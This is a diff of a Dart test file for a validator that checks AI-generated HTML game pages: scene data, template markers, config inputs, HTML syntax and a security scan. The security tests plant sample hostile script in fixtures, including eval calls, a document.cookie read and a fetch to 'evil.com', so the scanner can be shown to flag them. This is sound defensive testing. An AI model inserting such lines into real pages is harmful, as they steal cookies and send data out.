@@ -91,8 +91,7 @@ const GAME_SCENES = [{"id":"a","narrative":"n","choices":[]}];
 
     test('字符串字面量与转义引号内 \']\' 与 \'[\' 被整体跳过', () {
       final html = minValidHtml(
-        scenesJson:
-            '[{"id":"s","narrative":"列表 [1,2] 与 ] 字符及 \\"转义引号\\"，均不截断","choices":[]}]',
+        scenesJson: '[{"id":"s","narrative":"列表 [1,2] 与 ] 字符及 \\"转义引号\\"，均不截断","choices":[]}]',
       );
       final raw = extractScenesLiteral(html);
       expect(raw, isNotNull);
@@ -103,8 +102,7 @@ const GAME_SCENES = [{"id":"a","narrative":"n","choices":[]}];
 
     test('单引号与反引号字符串状态均可正确闭合', () {
       final html = minValidHtml(
-        scenesJson:
-            '[{"id":"s","narrative":"单引号 \'a[b]\' 与反引号 `c]d` 维持跨层","choices":[]}]',
+        scenesJson: '[{"id":"s","narrative":"单引号 \'a[b]\' 与反引号 `c]d` 维持跨层","choices":[]}]',
       );
       final raw = extractScenesLiteral(html);
       expect(raw, isNotNull);
@@ -112,7 +110,8 @@ const GAME_SCENES = [{"id":"a","narrative":"n","choices":[]}];
     });
 
     test('损坏数组（括号不闭合）→ null（不进入 JSON 解析）', () {
-      const html = '<html><script>var GAME_SCENES = [{"id":"a","narrative":"n","choices":[]};</script></html>';
+      const html =
+          '<html><script>var GAME_SCENES = [{"id":"a","narrative":"n","choices":[]};</script></html>';
       expect(extractScenesLiteral(html), isNull);
     });
 
@@ -137,7 +136,8 @@ const GAME_SCENES = [{"id":"a","narrative":"n","choices":[]}];
     });
 
     test('GAME_SCENES 值不是合法 JSON → JSON 解析失败', () {
-      const html = '<html><body><script>\nvar GAME_SCENES = [not json];\n</script></body></html>';
+      const html =
+          '<html><body><script>\nvar GAME_SCENES = [not json];\n</script></body></html>';
       final err = checkGameData(html);
       expect(err, isNotNull);
       expect(err!.field, 'data');
@@ -152,10 +152,16 @@ const GAME_SCENES = [{"id":"a","narrative":"n","choices":[]}];
 
     test('场景缺 narrative（空字符串/缺失）→ 缺少叙事文本', () {
       String errOf(String s) => checkGameData(s)!.message;
-      expect(errOf(minValidHtml(scenesJson: '[{"id":"a","narrative":"","choices":[]}]')),
-          contains('缺少叙事文本'));
-      expect(errOf(minValidHtml(scenesJson: '[{"id":"a","choices":[]}]')),
-          contains('缺少叙事文本'));
+      expect(
+        errOf(
+          minValidHtml(scenesJson: '[{"id":"a","narrative":"","choices":[]}]'),
+        ),
+        contains('缺少叙事文本'),
+      );
+      expect(
+        errOf(minValidHtml(scenesJson: '[{"id":"a","choices":[]}]')),
+        contains('缺少叙事文本'),
+      );
     });
 
     test('场景缺 choices 数组 → 数据错误', () {
@@ -169,13 +175,17 @@ const GAME_SCENES = [{"id":"a","narrative":"n","choices":[]}];
     test('选项缺 text / next → 数据错误', () {
       expect(
         checkGameData(
-          minValidHtml(scenesJson: '[{"id":"a","narrative":"n","choices":[{"next":"b"}]}]'),
+          minValidHtml(
+            scenesJson: '[{"id":"a","narrative":"n","choices":[{"next":"b"}]}]',
+          ),
         )!.message,
         contains('text'),
       );
       expect(
         checkGameData(
-          minValidHtml(scenesJson: '[{"id":"a","narrative":"n","choices":[{"text":"去"}]}]'),
+          minValidHtml(
+            scenesJson: '[{"id":"a","narrative":"n","choices":[{"text":"去"}]}]',
+          ),
         )!.message,
         contains('next'),
       );
@@ -184,8 +194,7 @@ const GAME_SCENES = [{"id":"a","narrative":"n","choices":[]}];
     test('场景 id 重复 → 数据错误（去重）', () {
       final err = checkGameData(
         minValidHtml(
-          scenesJson:
-              '[{"id":"start","narrative":"开头","choices":[]},{"id":"start","narrative":"另一个","choices":[]}]',
+          scenesJson: '[{"id":"start","narrative":"开头","choices":[]},{"id":"start","narrative":"另一个","choices":[]}]',
         ),
       );
       expect(err, isNotNull);
@@ -203,8 +212,7 @@ const GAME_SCENES = [{"id":"a","narrative":"n","choices":[]}];
     test('选项引用不存在的场景 → 引用错误', () {
       final err = checkGameData(
         minValidHtml(
-          scenesJson:
-              '[{"id":"start","narrative":"开头","choices":[{"text":"走","next":"ghost"}]}]',
+          scenesJson: '[{"id":"start","narrative":"开头","choices":[{"text":"走","next":"ghost"}]}]',
         ),
       );
       expect(err, isNotNull);
@@ -249,8 +257,7 @@ const GAME_SCENES = [{"id":"a","narrative":"n","choices":[]}];
     test('自引用 next → 通过（无限循环属叙事自由）', () {
       final err = checkGameData(
         minValidHtml(
-          scenesJson:
-              '[{"id":"start","narrative":"开头","choices":[{"text":"永远留下","next":"start"}]}]',
+          scenesJson: '[{"id":"start","narrative":"开头","choices":[{"text":"永远留下","next":"start"}]}]',
         ),
       );
       expect(err, isNull);
@@ -259,8 +266,7 @@ const GAME_SCENES = [{"id":"a","narrative":"n","choices":[]}];
     test('双向循环 next → 通过（设计允许）', () {
       final err = checkGameData(
         minValidHtml(
-          scenesJson:
-              '[{"id":"a","narrative":"A","choices":[{"text":"去 B","next":"b"}]},{"id":"b","narrative":"B","choices":[{"text":"回 A","next":"a"}]}]',
+          scenesJson: '[{"id":"a","narrative":"A","choices":[{"text":"去 B","next":"b"}]},{"id":"b","narrative":"B","choices":[{"text":"回 A","next":"a"}]}]',
         ),
       );
       expect(err, isNull);
@@ -287,38 +293,43 @@ const GAME_SCENES = [{"id":"a","narrative":"n","choices":[]}];
       final earlyHtml =
           '${'<meta charset="utf-8">' * 5}<html><body>后置骨架</body></html>';
       expect(
-        validateGeneratedHtml(earlyHtml)
-            .where((e) => e.field == 'structure'),
+        validateGeneratedHtml(earlyHtml).where((e) => e.field == 'structure'),
         isEmpty,
       );
       // <html> 超出前 200 字符窗口（且无 doctype）→ structure 错误（窗口边界）
       final lateHtml =
           '${'<meta charset="utf-8">' * 30}<html><body>太晚</body></html>';
       expect(
-        validateGeneratedHtml(lateHtml)
-            .where((e) => e.field == 'structure'),
+        validateGeneratedHtml(lateHtml).where((e) => e.field == 'structure'),
         isNotEmpty,
       );
     });
 
     test('template：残留 <!-- GEN:config --> 标记 → 错误', () {
       final html = minValidHtml().replaceAll(
-          'var GAME_CONFIG = {"title":"测试世界","world":"一个用于测试的世界"};',
-          'var GAME_CONFIG = <!-- GEN:config -->;');
+        'var GAME_CONFIG = {"title":"测试世界","world":"一个用于测试的世界"};',
+        'var GAME_CONFIG = <!-- GEN:config -->;',
+      );
       final errors = validateGeneratedHtml(html);
       expect(errors.map((e) => e.field), contains('template'));
     });
 
     test('template：小写残留标记同样命中（大小写不敏感）', () {
       final html = minValidHtml().replaceAll(
-          'var GAME_CONFIG = {"title":"测试世界","world":"一个用于测试的世界"};',
-          'var GAME_CONFIG = <!-- gen:config -->;');
-      expect(validateGeneratedHtml(html).where((e) => e.field == 'template'),
-          isNotEmpty);
+        'var GAME_CONFIG = {"title":"测试世界","world":"一个用于测试的世界"};',
+        'var GAME_CONFIG = <!-- gen:config -->;',
+      );
+      expect(
+        validateGeneratedHtml(html).where((e) => e.field == 'template'),
+        isNotEmpty,
+      );
     });
 
     test('cfg：缺任一 cfg- 输入框 → cfg 错误且列出缺件', () {
-      final html = minValidHtml().replaceAll('id="cfg-endpoint"', 'id="x-endpoint"');
+      final html = minValidHtml().replaceAll(
+        'id="cfg-endpoint"',
+        'id="x-endpoint"',
+      );
       final errors = validateGeneratedHtml(html);
       final cfg = errors.where((e) => e.field == 'cfg').toList();
       expect(cfg, hasLength(1));
@@ -333,9 +344,13 @@ const GAME_SCENES = [{"id":"a","narrative":"n","choices":[]}];
 
     test('cfg：cfg- id 只在注释里（假阳性）→ 判定缺失', () {
       final html = minValidHtml().replaceAll(
-          '<input type="hidden" id="cfg-endpoint">',
-          '<!-- <input type="hidden" id="cfg-endpoint"> 注释假配置 -->');
-      expect(validateGeneratedHtml(html).where((e) => e.field == 'cfg'), isNotEmpty);
+        '<input type="hidden" id="cfg-endpoint">',
+        '<!-- <input type="hidden" id="cfg-endpoint"> 注释假配置 -->',
+      );
+      expect(
+        validateGeneratedHtml(html).where((e) => e.field == 'cfg'),
+        isNotEmpty,
+      );
     });
 
     test('syntax：未闭合 HTML 注释 → 语法错误', () {
@@ -351,20 +366,79 @@ const GAME_SCENES = [{"id":"a","narrative":"n","choices":[]}];
     });
 
     test('syntax：自闭合形态 <script/ 无闭合体 → 语法错误（标签边界判定）', () {
-      final errors = validateGeneratedHtml('<!DOCTYPE html><html><body><script/></body></html>');
+      final errors = validateGeneratedHtml(
+        '<!DOCTYPE html><html><body><script/></body></html>',
+      );
       expect(errors.map((e) => e.field), contains('syntax'));
     });
 
     test('syntax：畸形标签样本扫描不崩（crd 回归，宽容视为可解析）', () {
-      final html = "<!DOCTYPE html><html><body><div><toto&>a < b</div><span></span></body></html>";
+      final html =
+          "<!DOCTYPE html><html><body><div><toto&>a < b</div><span></span></body></html>";
       final errors = validateGeneratedHtml(html);
       expect(errors.map((e) => e.field), isNot(contains('syntax')));
       // structure/cfg/data 等其余检查照常产出（不崩）
       expect(errors, isNotEmpty);
     });
 
+    // ── F-40：script 开/闭标签大小写统一 + script 块内 <!-- 不按 HTML 注释误报 ──
+
+    test('syntax F-40：大写 <SCRIPT> 未闭合 → 语法错误（开标签大小写不敏感）', () {
+      final errors = validateGeneratedHtml(
+        '<!DOCTYPE html><html><body><SCRIPT>var x=1;',
+      );
+      expect(
+        errors.map((e) => e.field),
+        contains('syntax'),
+        reason: '开标签大小写统一后，大写 <SCRIPT> 同样进入块扫描 → 未闭合报错',
+      );
+    });
+
+    test('syntax F-40：大写 <SCRIPT> 块正常闭合 → 无语法错误（开/闭同口径）', () {
+      final errors = validateGeneratedHtml(
+        '<!DOCTYPE html><html><body><SCRIPT>var x = 1;</SCRIPT>'
+        '<DIV id="game-wrap"></DIV></body></html>',
+      );
+      expect(errors.map((e) => e.field), isNot(contains('syntax')));
+    });
+
+    test('syntax F-40：script 块内含 <!-- 文本（闭合）→ 不按 HTML 注释误报', () {
+      final errors = validateGeneratedHtml(
+        '<!DOCTYPE html><html><body><script>var msg = "<!-- note";'
+        '</script><div id="game-wrap"></div></body></html>',
+      );
+      expect(
+        errors.map((e) => e.field),
+        isNot(contains('syntax')),
+        reason: 'script 内容为 raw text：内部 <!-- 不是 HTML 注释，不得误判未闭合',
+      );
+    });
+
+    test('syntax F-40：大写 <SCRIPT> 块内含 <!-- 无 --> 文本 → 不误报注释（此前'
+        '误判「未闭合的 HTML 注释」误拒合法 HTML）', () {
+      final errors = validateGeneratedHtml(
+        '<!DOCTYPE html><html><body><SCRIPT>var msg = "<!--";</SCRIPT>'
+        '<div id="game-wrap"></div></body></html>',
+      );
+      expect(
+        errors.map((e) => e.field),
+        isNot(contains('syntax')),
+        reason: 'script 块整体跳至 </script>：内部 <!-- 不算 HTML 注释',
+      );
+    });
+
+    test('syntax F-40：真实未闭合 HTML 注释仍报错（script 修复不误伤真注释）', () {
+      final errors = validateGeneratedHtml(
+        '<!DOCTYPE html><html><body><!-- 未闭合注释<div id="game-wrap"></div>',
+      );
+      expect(errors.map((e) => e.field), contains('syntax'));
+    });
+
     test('security：含 eval → 命中键集并入错误文案', () {
-      final html = minValidHtml().replaceAll('</script>', 'eval("danger");\n</script>');
+      final html = minValidHtml().replaceAll(
+        '</script>',
+        'eval("danger");\n</script>',
+      );
       final errors = validateGeneratedHtml(html);
       final sec = errors.where((e) => e.field == 'security').toList();
       expect(sec, hasLength(1));
@@ -373,8 +447,9 @@ const GAME_SCENES = [{"id":"a","narrative":"n","choices":[]}];
 
     test('security：三键混合 → 键集全部列出（含中文文案前缀）', () {
       final html = minValidHtml().replaceAll(
-          '</script>',
-          'eval("x"); var c = document.cookie; fetch("http://evil.com/data");\n</script>');
+        '</script>',
+        'eval("x"); var c = document.cookie; fetch("http://evil.com/data");\n</script>',
+      );
       final errors = validateGeneratedHtml(html);
       final sec = errors.where((e) => e.field == 'security').toList();
       expect(sec, hasLength(1));
@@ -394,7 +469,10 @@ const GAME_SCENES = [{"id":"a","narrative":"n","choices":[]}];
     });
 
     test('security：precomputedWarnings=[] 压下真实命中（证明未重扫）', () {
-      final html = minValidHtml().replaceAll('</script>', 'eval("x");\n</script>');
+      final html = minValidHtml().replaceAll(
+        '</script>',
+        'eval("x");\n</script>',
+      );
       final errors = validateGeneratedHtml(html, precomputedWarnings: const []);
       expect(errors.where((e) => e.field == 'security'), isEmpty);
     });
@@ -443,10 +521,7 @@ const GAME_SCENES = [{"id":"a","narrative":"n","choices":[]}];
 
     test('vGAME_SCENES 括号永不闭合 → null（不越界）', () {
       expect(extractScenesLiteral('var GAME_SCENES = ['), isNull);
-      expect(
-        extractScenesLiteral('const GAME_SCENES = [{"id":"a"'),
-        isNull,
-      );
+      expect(extractScenesLiteral('const GAME_SCENES = [{"id":"a"'), isNull);
     });
 
     test('转义序列恰在字符串末尾（越界保护）→ 不崩', () {
@@ -485,7 +560,8 @@ const GAME_SCENES = [{"id":"a","narrative":"n","choices":[]}];
     });
 
     test('GAME_SCENES 定位正则紧贴行首/无空白（let 边界）', () {
-      const html = '<script>let GAME_SCENES=[{"id":"a","narrative":"n","choices":[]}];</script>';
+      const html =
+          '<script>let GAME_SCENES=[{"id":"a","narrative":"n","choices":[]}];</script>';
       final raw = extractScenesLiteral(html);
       expect(raw, isNotNull);
       expect(json.decode(raw!), hasLength(1));
@@ -529,11 +605,17 @@ const GAME_SCENES = [{"id":"a","narrative":"n","choices":[]}];
       );
       expect(result.game['source'], 'generated');
       expect(result.game['type'], 'ai');
-      expect(result.game['config'],
-          {'endpoint': 'cfg-endpoint', 'apikey': 'cfg-apikey', 'model': 'cfg-model'});
+      expect(result.game['config'], {
+        'endpoint': 'cfg-endpoint',
+        'apikey': 'cfg-apikey',
+        'model': 'cfg-model',
+      });
       expect(result.warnings, isEmpty);
-      expect(File('${parent.path}${Platform.pathSeparator}generated-game.html')
-          .existsSync(), isTrue);
+      expect(
+        File('${parent.path}${Platform.pathSeparator}generated-game.html')
+            .existsSync(),
+        isTrue,
+      );
     });
   });
 }
